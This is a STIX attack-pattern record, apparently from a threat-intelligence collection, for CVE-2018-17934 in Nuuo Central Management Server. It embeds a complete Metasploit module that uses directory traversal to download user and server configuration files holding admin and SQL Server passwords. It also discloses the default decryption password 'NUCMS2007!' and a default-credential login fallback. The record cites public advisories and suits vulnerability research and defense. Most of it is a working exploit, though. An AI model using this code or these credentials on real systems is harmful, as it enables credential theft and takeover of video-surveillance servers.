{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--413bcef8-03cd-4544-b7f7-7352fe403f40",
    "created": "2024-08-14T16:31:45.57368Z",
    "modified": "2024-08-14T16:31:45.573684Z",
    "name": "Nuuo Central Management Server Authenticated Arbitrary File Download",
    "description": " The Nuuo Central Management Server allows an authenticated user to download files from the installation folder. This functionality can be abused to obtain administrative credentials the SQL Server database password and arbitrary files off the system with directory traversal. The module will attempt to download CMServer.cfg (the user configuration file with all the user passwords including the admin one), ServerConfig.cfg (the server configuration file with the SQL Server password) and a third file if the FILE argument is provided by the user. The two .cfg files are zip-encrypted files, but due to limitations of the Ruby ZIP modules included in Metasploit, these files cannot be decrypted programmatically. The user will have to open them with zip or a similar program and provide the default password \"NUCMS2007!\". This module will either use a provided session number (which can be guessed with an auxiliary module) or attempt to login using a provided username and password - it will also try the default credentials if nothing is provided. All versions of CMS server up to and including 3.5 are vulnerable to this attack. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/nuuo_cms_file_download.rb",
            "external_id": "nuuo_cms_file_download.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-17934"
        },
        {
            "source_name": "reference",
            "url": "https://www.cisa.gov/uscert/ics/advisories/ICSA-18-284-02"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2019/Jan/51"
        },
        {
            "source_name": "reference",
            "url": "https://raw.githubusercontent.com/pedrib/PoC/master/advisories/NUUO/nuuo-cms-ownage.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  include Msf::Exploit::Remote::Nuuo\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Nuuo Central Management Server Authenticated Arbitrary File Download',\n      'Description'    => %q{\n      The Nuuo Central Management Server allows an authenticated user to download files from the\n      installation folder. This functionality can be abused to obtain administrative credentials,\n      the SQL Server database password and arbitrary files off the system with directory traversal.\n      The module will attempt to download CMServer.cfg (the user configuration file with all the user\n      passwords including the admin one), ServerConfig.cfg (the server configuration file with the\n      SQL Server password) and a third file if the FILE argument is provided by the user.\n      The two .cfg files are zip-encrypted files, but due to limitations of the Ruby ZIP modules\n      included in Metasploit, these files cannot be decrypted programmatically. The user will\n      have to open them with zip or a similar program and provide the default password \"NUCMS2007!\".\n      This module will either use a provided session number (which can be guessed with an auxiliary\n      module) or attempt to login using a provided username and password - it will also try the\n      default credentials if nothing is provided.\n      All versions of CMS server up to and including 3.5 are vulnerable to this attack.\n      },\n      'Author'         =>\n        [\n          'Pedro Ribeiro <pedrib@gmail.com>'         # Vulnerability discovery and Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2018-17934' ],\n          [ 'URL', 'https://www.cisa.gov/uscert/ics/advisories/ICSA-18-284-02' ],\n          [ 'URL', 'https://seclists.org/fulldisclosure/2019/Jan/51' ],\n          [ 'URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/NUUO/nuuo-cms-ownage.txt' ]\n\n        ],\n      'Platform'        => ['win'],\n      'Privileged'      => true,\n      'DisclosureDate'  => '2018-10-11'))\n\n    register_options(\n      [\n        OptInt.new('DEPTH', [true, 'Directory traversal depth [..\\]', 2]),\n        OptString.new('FILE', [false, 'Additional file to download'])\n      ])\n  end\n\n  def download_file(file_name, ctype='application/zip', depth=2)\n    res = ncs_send_request({\n      'method'        => 'GETCONFIG',\n      'user_session'  => user_session,\n      'file_name'     => %{#{\"..\\\\\"*depth}#{file_name}}\n    })\n\n    return nil unless res\n    path = store_loot(file_name, ctype, datastore['RHOST'],\n                      res.body, file_name, \"Nuuo CMS #{file_name} downloaded\")\n    print_good(\"Downloaded file to #{path}\")\n  end\n\n  def run\n    connect\n    res = ncs_login\n\n    unless res\n      fail_with(Failure::NoAccess, \"Failed to login to Nuuo CMS\")\n    end\n\n    download_file('CMServer.cfg')\n    download_file('ServerConfig.cfg')\n\n    info = %q{\n    The user and server configuration files were stored in the loot database.\n    The files are ZIP encrypted, and due to the lack of the archive/zip gem,\n    they cannot be decrypted in Metasploit.\n    You will need to open them up with zip or a similar utility, and use the\n    password NUCMS2007! to unzip them.\n    Annoy the Metasploit developers until this gets fixed!\n    }\n    print_status(\"\\r\\n#{info}\")\n\n    if datastore['FILE']\n      download_file(datastore['FILE'], 'application/octet-stream', datastore['DEPTH'])\n    end\n\n    client.close\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-10-11",
    "x_mitre_platforms": [
        "['win']"
    ]
}